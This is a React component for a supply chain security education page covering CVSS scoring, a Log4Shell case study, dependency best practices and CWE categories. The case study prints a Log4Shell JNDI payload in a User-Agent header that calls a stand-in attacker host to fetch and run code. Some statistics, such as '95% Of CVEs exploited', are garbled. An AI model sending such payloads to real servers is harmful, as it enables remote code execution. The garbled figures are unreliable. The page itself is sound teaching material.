import React, { useState } from 'react';
import { BookOpen, ChevronDown, ChevronUp, ExternalLink, AlertOctagon, Shield, Code, Globe } from 'lucide-react';
import { clsx } from 'clsx';

/**
 * EducationHub - Integrated learning platform for supply chain security
 * 
 * This teaches:
 * - CVSS scoring system
 * - Log4Shell case study (one of the most impactful vulns ever)
 * - Supply chain security best practices
 * - CWE categories
 */

const CVSS_COMPONENTS = [
  { metric: 'Attack Vector (AV)', scale: ['Network', 'Adjacent', 'Local', 'Physical'], description: 'How is the vulnerability accessed?' },
  { metric: 'Attack Complexity (AC)', scale: ['Low', 'High'], description: 'How easy is it to exploit?' },
  { metric: 'Privileges Required (PR)', scale: ['None', 'Low', 'High'], description: 'What privileges does the attacker need?' },
  { metric: 'User Interaction (UI)', scale: ['None', 'Required'], description: 'Does a user need to take action?' },
  { metric: 'Scope (S)', scale: ['Unchanged', 'Changed'], description: 'Does it affect other components?' },
  { metric: 'Confidentiality (C)', scale: ['None', 'Low', 'High'], description: 'Can attacker read data?' },
  { metric: 'Integrity (I)', scale: ['None', 'Low', 'High'], description: 'Can attacker modify data?' },
  { metric: 'Availability (A)', scale: ['None', 'Low', 'High'], description: 'Can attacker crash service?' },
];

const LOG4SHELL_TIMELINE = [
  { date: 'Dec 9, 2021', event: 'Vulnerability publicly disclosed by Alibaba Cloud security team', type: 'disclosure' },
  { date: 'Dec 10, 2021', event: 'Apache releases initial fix (2.15.0), but exploitation already widespread', type: 'fix' },
  { date: 'Dec 10, 2021', event: 'First mass exploitation observed in the wild', type: 'exploit' },
  { date: 'Dec 13, 2021', event: 'Wide-scale automated attacks begin targeting millions of servers', type: 'exploit' },
  { date: 'Dec 14, 2021', event: 'Secondary vulnerability CVE-2021-45046 discovered in the "fix"', type: 'disclosure' },
  { date: 'Dec 18, 2021', event: 'Apache releases 2.17.0 addressing multiple follow-on vulnerabilities', type: 'fix' },
  { date: 'Jan 2022', event: '95% of exploitation attempts using Log4Shell; ransomware groups weaponize', type: 'exploit' },
  { date: 'Feb 2023', event: 'Still actively exploited; CISA adds to Known Exploited Vulnerabilities catalog', type: 'ongoing' },
];

const BEST_PRACTICES = [
  {
    title: 'Pin Your Dependencies',
    icon: '📌',
    description: 'Use exact version numbers instead of ranges (e.g., "lodash": "4.17.21" not "^4.0.0"). This prevents silent updates that could introduce vulnerabilities.',
    code: `// ❌ Risky: Auto-updates to latest minor
"lodash": "^4.0.0"

// ✅ Safe: Pinned to exact version
"lodash": "4.17.21"`,
  },
  {
    title: 'Regular Dependency Audits',
    icon: '🔍',
    description: 'Run npm audit, snyk test, or similar tools in CI/CD pipelines. Set up automated PRs for dependency updates.',
    code: `# Run in CI/CD pipeline
npm audit --audit-level=high
snyk test --severity-threshold=high`,
  },
  {
    title: 'Use Lock Files',
    icon: '🔒',
    description: 'Always commit package-lock.json or yarn.lock. These files ensure reproducible builds and prevent dependency confusion attacks.',
    code: `# Ensure lock file integrity
npm ci  # instead of npm install
# Uses package-lock.json exactly`,
  },
  {
    title: 'Verify Package Integrity',
    icon: '✅',
    description: 'Use integrity hash checking (npm automatically does this). Verify package authenticity from the registry.',
    code: `# package-lock.json includes integrity hashes
"integrity": "sha512-abc...xyz=="`,
  },
  {
    title: 'Minimize Dependency Count',
    icon: '📦',
    description: 'Every dependency is a potential attack vector. Use built-in APIs when possible. Is "is-even" really necessary?',
    code: `// ❌ Unnecessary dependency
import isEven from 'is-even';

// ✅ Use built-in
const isEven = (n) => n % 2 === 0;`,
  },
  {
    title: 'Monitor for New CVEs',
    icon: '📢',
    description: 'Subscribe to security advisories for your key dependencies. Tools: GitHub Security Advisories, Snyk, OSV.dev.',
    code: `# Subscribe to GitHub Security Advisories
# Enable Dependabot alerts in GitHub settings
# Set up: security advisories notifications`,
  },
];

const CWE_CATEGORIES = [
  { id: 'CWE-94', name: 'Code Injection', risk: 'Critical', example: 'Log4Shell JNDI Injection' },
  { id: 'CWE-89', name: 'SQL Injection', risk: 'High', example: 'Unsanitized database queries' },
  { id: 'CWE-79', name: 'Cross-Site Scripting (XSS)', risk: 'Medium', example: 'Unescaped user input in React' },
  { id: 'CWE-502', name: 'Deserialization of Untrusted Data', risk: 'Critical', example: 'Spring4Shell deserialization' },
  { id: 'CWE-22', name: 'Path Traversal', risk: 'High', example: 'File system access via ../../' },
  { id: 'CWE-295', name: 'Improper Certificate Validation', risk: 'Medium', example: 'TLS cert bypass' },
  { id: 'CWE-798', name: 'Use of Hard-coded Credentials', risk: 'Critical', example: 'API keys in source code' },
  { id: 'CWE-611', name: 'XML External Entity (XXE)', risk: 'High', example: 'SAML auth bypass' },
];

const Accordion = ({ title, icon, children, defaultOpen = false }) => {
  const [isOpen, setIsOpen] = useState(defaultOpen);
  return (
    <div className="card">
      <button
        className="w-full flex items-center justify-between text-left"
        onClick={() => setIsOpen(!isOpen)}
      >
        <div className="flex items-center gap-2">
          <span className="text-xl">{icon}</span>
          <span className="font-semibold text-slate-700 dark:text-slate-200">{title}</span>
        </div>
        {isOpen ? (
          <ChevronUp className="w-5 h-5 text-slate-400" />
        ) : (
          <ChevronDown className="w-5 h-5 text-slate-400" />
        )}
      </button>
      {isOpen && <div className="mt-4 border-t border-slate-200 dark:border-slate-700 pt-4">{children}</div>}
    </div>
  );
};

const EducationHub = () => {
  return (
    <div className="space-y-5">
      <div>
        <h2 className="text-xl font-bold text-slate-900 dark:text-white flex items-center gap-2">
          <BookOpen className="w-6 h-6 text-indigo-500" />
          Supply Chain Security Education Hub
        </h2>
        <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">
          Learn supply chain security concepts with real-world examples and case studies
        </p>
      </div>

      {/* CVSS Explainer */}
      <Accordion title="CVSS Scoring System Explained" icon="📊" defaultOpen={true}>
        <div className="space-y-4">
          <div className="prose dark:prose-invert max-w-none">
            <p className="text-sm text-slate-600 dark:text-slate-400">
              <strong>CVSS (Common Vulnerability Scoring System)</strong> is an open framework for communicating 
              the severity of software vulnerabilities. Scores range from 0 to 10, with higher scores indicating 
              more severe vulnerabilities.
            </p>
          </div>

          {/* Severity Scale */}
          <div>
            <p className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-2">Severity Scale (CVSS v3.1)</p>
            <div className="grid grid-cols-2 md:grid-cols-5 gap-2 text-sm">
              {[
                { range: '0.0', label: 'None', color: 'bg-slate-100 text-slate-600' },
                { range: '0.1-3.9', label: 'Low', color: 'bg-green-100 text-green-700 dark:bg-green-900/30 dark:text-green-400' },
                { range: '4.0-6.9', label: 'Medium', color: 'bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400' },
                { range: '7.0-8.9', label: 'High', color: 'bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400' },
                { range: '9.0-10.0', label: 'Critical', color: 'bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400' },
              ].map(({ range, label, color }) => (
                <div key={label} className={clsx('p-3 rounded-lg text-center font-semibold', color)}>
                  <div className="text-lg">{range}</div>
                  <div className="text-xs mt-0.5">{label}</div>
                </div>
              ))}
            </div>
          </div>

          {/* CVSS Components */}
          <div>
            <p className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-2">CVSS v3.1 Components</p>
            <div className="space-y-2">
              {CVSS_COMPONENTS.map((comp) => (
                <div key={comp.metric} className="flex items-start gap-3 p-2 bg-slate-50 dark:bg-slate-700/50 rounded-lg">
                  <div className="flex-1">
                    <p className="text-sm font-medium text-slate-700 dark:text-slate-300">{comp.metric}</p>
                    <p className="text-xs text-slate-500 dark:text-slate-400">{comp.description}</p>
                  </div>
                  <div className="flex flex-wrap gap-1">
                    {comp.scale.map(val => (
                      <span key={val} className="text-xs bg-white dark:bg-slate-700 border border-slate-200 dark:border-slate-600 px-2 py-0.5 rounded text-slate-600 dark:text-slate-400">
                        {val}
                      </span>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </Accordion>

      {/* Log4Shell Case Study */}
      <Accordion title="Log4Shell Case Study (CVE-2021-44228)" icon="🔥" defaultOpen={true}>
        <div className="space-y-5">
          <div className="flex items-start gap-3 p-4 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg">
            <AlertOctagon className="w-6 h-6 text-red-500 flex-shrink-0 mt-0.5" />
            <div>
              <p className="font-semibold text-red-700 dark:text-red-400 text-lg">
                CVSS Score: 10.0 — Maximum Severity
              </p>
              <p className="text-sm text-red-600 dark:text-red-500 mt-1">
                Log4Shell is considered one of the most catastrophic vulnerabilities ever discovered. 
                It affected millions of applications worldwide and cost billions in remediation.
              </p>
            </div>
          </div>

          {/* Why CVSS 10.0 */}
          <div>
            <h4 className="font-semibold text-slate-700 dark:text-slate-200 mb-3">
              Why Did Log4Shell Get CVSS 10.0? (The Perfect Storm)
            </h4>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              {[
                { metric: 'Attack Vector', value: 'NETWORK', meaning: 'Exploitable remotely via internet' },
                { metric: 'Attack Complexity', value: 'LOW', meaning: 'Single crafted HTTP header' },
                { metric: 'Privileges Required', value: 'NONE', meaning: 'No authentication needed' },
                { metric: 'User Interaction', value: 'NONE', meaning: 'Fully automated exploitation' },
                { metric: 'Scope', value: 'CHANGED', meaning: 'RCE outside the Java process' },
                { metric: 'Confidentiality', value: 'HIGH', meaning: 'Full system file access' },
                { metric: 'Integrity', value: 'HIGH', meaning: 'Can modify any data/code' },
                { metric: 'Availability', value: 'HIGH', meaning: 'Can crash entire service' },
              ].map(({ metric, value, meaning }) => (
                <div key={metric} className="bg-slate-50 dark:bg-slate-700/50 rounded-lg p-3">
                  <p className="text-xs text-slate-500 dark:text-slate-400">{metric}</p>
                  <p className="text-sm font-bold text-red-600 dark:text-red-400">{value}</p>
                  <p className="text-xs text-slate-400 mt-1">{meaning}</p>
                </div>
              ))}
            </div>
          </div>

          {/* How it Works */}
          <div>
            <h4 className="font-semibold text-slate-700 dark:text-slate-200 mb-2">How the Attack Works</h4>
            <div className="bg-slate-900 text-green-400 p-4 rounded-lg font-mono text-sm space-y-1">
              <p># Attacker sends this HTTP request to any server using log4j:</p>
              <p className="text-yellow-400">GET / HTTP/1.1</p>
              <p className="text-yellow-400">{'User-Agent: ${jndi:ldap://attacker.com/exploit}'}</p>
              <p className="mt-2 text-slate-500"># Log4j logs the User-Agent string</p>
              <p className="text-slate-500"># Java evaluates the JNDI lookup</p>
              <p className="text-slate-500"># Downloads and executes code from attacker server</p>
              <p className="text-red-400 mt-2"># Result: Remote Code Execution on your server! 💀</p>
            </div>
          </div>

          {/* Timeline */}
          <div>
            <h4 className="font-semibold text-slate-700 dark:text-slate-200 mb-3">Attack Timeline</h4>
            <div className="relative">
              <div className="absolute left-4 top-0 bottom-0 w-0.5 bg-slate-200 dark:bg-slate-700" />
              <div className="space-y-4">
                {LOG4SHELL_TIMELINE.map((event, i) => (
                  <div key={i} className="flex gap-4 pl-10 relative">
                    <div className={clsx(
                      'absolute left-2 top-1.5 w-4 h-4 rounded-full border-2 border-white dark:border-slate-800',
                      event.type === 'exploit' ? 'bg-red-500' :
                      event.type === 'fix' ? 'bg-green-500' :
                      event.type === 'ongoing' ? 'bg-orange-500' : 'bg-blue-500'
                    )} />
                    <div>
                      <p className="text-xs font-semibold text-slate-500 dark:text-slate-400">{event.date}</p>
                      <p className="text-sm text-slate-700 dark:text-slate-300 mt-0.5">{event.event}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Real-world Impact */}
          <div>
            <h4 className="font-semibold text-slate-700 dark:text-slate-200 mb-2">Real-World Impact</h4>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              {[
                { stat: '~3B', label: 'Devices affected', icon: Globe },
                { stat: '$2-10B', label: 'Remediation cost', icon: Code },
                { stat: '95%', label: 'Of CVEs exploited', icon: AlertOctagon },
                { stat: '2+ years', label: 'Still exploited', icon: Shield },
              ].map(({ stat, label, icon: Icon }) => (
                <div key={label} className="bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg p-3 text-center">
                  <p className="text-2xl font-bold text-red-700 dark:text-red-400">{stat}</p>
                  <p className="text-xs text-red-600 dark:text-red-500 mt-1">{label}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="flex justify-end">
            <a
              href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-2 text-sm text-blue-600 dark:text-blue-400 hover:underline"
            >
              View on NVD <ExternalLink className="w-4 h-4" />
            </a>
          </div>
        </div>
      </Accordion>

      {/* Best Practices */}
      <Accordion title="Supply Chain Security Best Practices" icon="🛡️">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {BEST_PRACTICES.map((practice) => (
            <div key={practice.title} className="border border-slate-200 dark:border-slate-700 rounded-lg p-4">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-2xl">{practice.icon}</span>
                <h4 className="font-semibold text-slate-700 dark:text-slate-200">{practice.title}</h4>
              </div>
              <p className="text-sm text-slate-500 dark:text-slate-400 mb-3">{practice.description}</p>
              {practice.code && (
                <pre className="bg-slate-900 text-slate-300 p-3 rounded-lg text-xs overflow-x-auto">
                  <code>{practice.code}</code>
                </pre>
              )}
            </div>
          ))}
        </div>
      </Accordion>

      {/* CWE Explainer */}
      <Accordion title="CWE — Common Weakness Enumeration" icon="🔑">
        <div className="space-y-3">
          <p className="text-sm text-slate-600 dark:text-slate-400">
            CWE categorizes software weaknesses. Each CVE is typically associated with one or more CWEs, 
            helping developers understand the root cause and prevent similar issues.
          </p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {CWE_CATEGORIES.map((cwe) => (
              <div key={cwe.id} className="flex items-start gap-3 p-3 bg-slate-50 dark:bg-slate-700/50 rounded-lg">
                <span className={clsx(
                  'text-xs font-bold px-2 py-1 rounded shrink-0',
                  cwe.risk === 'Critical' ? 'bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400' :
                  cwe.risk === 'High' ? 'bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400' :
                  'bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400'
                )}>
                  {cwe.risk}
                </span>
                <div>
                  <p className="text-sm font-semibold text-slate-700 dark:text-slate-300">
                    {cwe.id}: {cwe.name}
                  </p>
                  <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                    Example: {cwe.example}
                  </p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </Accordion>

      {/* Resources */}
      <div className="card">
        <h3 className="font-semibold text-slate-700 dark:text-slate-200 mb-3">📚 External Resources</h3>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
          {[
            { name: 'NVD (NIST)', url: 'https://nvd.nist.gov', desc: 'Official CVE database' },
            { name: 'OWASP Top 10', url: 'https://owasp.org/Top10', desc: 'Web security risks' },
            { name: 'OSV.dev', url: 'https://osv.dev', desc: 'Open source vulnerabilities' },
            { name: 'CISA KEV', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog', desc: 'Known exploited vulns' },
            { name: 'Snyk Advisor', url: 'https://snyk.io/advisor', desc: 'Package health checker' },
            { name: 'CVSS Calculator', url: 'https://www.first.org/cvss/calculator/3.1', desc: 'Official CVSS tool' },
          ].map((resource) => (
            <a
              key={resource.name}
              href={resource.url}
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-between p-3 border border-slate-200 dark:border-slate-700 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors group"
            >
              <div>
                <p className="text-sm font-medium text-slate-700 dark:text-slate-300 group-hover:text-blue-600 dark:group-hover:text-blue-400">
                  {resource.name}
                </p>
                <p className="text-xs text-slate-400">{resource.desc}</p>
              </div>
              <ExternalLink className="w-4 h-4 text-slate-400 group-hover:text-blue-500" />
            </a>
          ))}
        </div>
      </div>
    </div>
  );
};

export default EducationHub;
